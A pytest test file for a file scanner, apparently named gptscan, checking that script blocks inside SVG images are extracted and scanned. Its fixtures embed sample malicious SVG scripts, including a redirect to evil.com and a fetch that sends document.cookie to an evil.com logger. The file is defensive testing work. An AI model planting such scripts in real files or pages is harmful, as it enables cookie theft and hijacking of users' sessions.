import pytest
from gptscan import unpack_content, Config, scan_files

def test_is_container_svg():
    """Verify that .svg files are recognized as containers."""
    assert Config.is_container("image.svg") is True
    assert Config.is_container("path/to/icon.svg") is True

def test_unpack_content_svg_extraction():
    """Verify that <script> blocks are correctly extracted from SVG files."""
    svg_content = """
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
        <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
        <script>
            console.log('SVG script detected');
            alert(document.domain);
        </script>
        <script type="text/ecmascript">
            window.location = "http://evil.com";
        </script>
    </svg>
    """
    content_bytes = svg_content.encode('utf-8')

    # Test with .svg extension
    snippets = list(unpack_content("test.svg", content_bytes))

    assert len(snippets) == 2

    assert snippets[0][0] == "test.svg [Script 1]"
    assert "console.log('SVG script detected');" in snippets[0][1].decode('utf-8')
    assert "alert(document.domain);" in snippets[0][1].decode('utf-8')

    assert snippets[1][0] == "test.svg [Script 2]"
    assert 'window.location = "http://evil.com";' in snippets[1][1].decode('utf-8')

def test_scan_files_svg_expansion(mock_tf_env, monkeypatch):
    """Test that an SVG file is expanded and its internal scripts are scanned."""
    # mock_tf_env is a fixture from conftest.py
    monkeypatch.setattr("gptscan.collect_files", lambda targets: [])

    svg_content = b"""
    <svg>
        <script>fetch('http://evil.com/logger?c=' + document.cookie);</script>
    </svg>
    """

    events = list(scan_files(
        scan_targets=[],
        deep_scan=False,
        show_all=True,
        use_gpt=False,
        extra_snippets=[("test.svg", svg_content)]
    ))

    results = [data for event, data in events if event == 'result']
    assert len(results) == 1
    assert "test.svg [Script 1]" in results[0][0]
    assert "fetch('http://evil.com/logger?c=' + document.cookie);" in results[0][5]
